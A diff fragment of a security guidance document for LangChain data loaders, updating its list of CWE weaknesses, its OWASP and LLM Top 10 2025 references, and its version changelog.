+- CWE-209: Information Exposure Through an Error Message
+- CWE-284: Improper Access Control
+- CWE-312: Cleartext Storage of Sensitive Information
+- CWE-359: Privacy Violation
+- CWE-400: Uncontrolled Resource Consumption
+- CWE-434: Unrestricted Upload of File with Dangerous Type
+- CWE-441: Unintended Proxy or Intermediary
+- CWE-770: Allocation of Resources Without Limits or Throttling
+- CWE-798: Use of Hard-coded Credentials
+- CWE-834: Excessive Iteration
+- CWE-918: Server-Side Request Forgery (SSRF)
+- CWE-1236: Improper Neutralization of Formula Elements in a CSV File
+- CWE-1357: Reliance on Insufficiently Trustworthy Component
 
 ### OWASP References
-- OWASP A03:2021 - Injection
-- OWASP A10:2021 - Server-Side Request Forgery
-- OWASP A05:2021 - Security Misconfiguration
-- OWASP A01:2021 - Broken Access Control
+- OWASP A01:2025 — Broken Access Control
+- OWASP A02:2025 — Cryptographic Failures
+- OWASP A03:2025 — Injection
+- OWASP A05:2025 — Security Misconfiguration
+- OWASP A06:2025 — Vulnerable and Outdated Components
+- OWASP A10:2025 — Server-Side Request Forgery (SSRF)
+- LLM01:2025 — Prompt Injection (applies to content loaded from web, API, and git loaders)
 
 ### Additional Resources
 - LangChain Security Best Practices
-- NIST AI RMF - Data Governance
-- GDPR Article 5 - Data Minimization
+- NIST AI RMF — Data Governance
+- GDPR Article 5 — Data Minimization
 
 ---
 
@@ -1280,3 +1652,4 @@ class UnsafeLoader(BaseLoader):
 | Version | Date | Changes |
 |---------|------|---------|
 | 1.0 | 2024-01 | Initial release with 8 core loader security rules |
+| 2.0 | 2026-05-26 | OWASP refs updated to 2025; LLM Top 10 2025 added; GitLoader auth, S3Loader IAM, UnstructuredFileLoader sandbox, JSONLoader jq_schema injection, CSVLoader formula injection rules added; langchain-community 0.3.x imports |
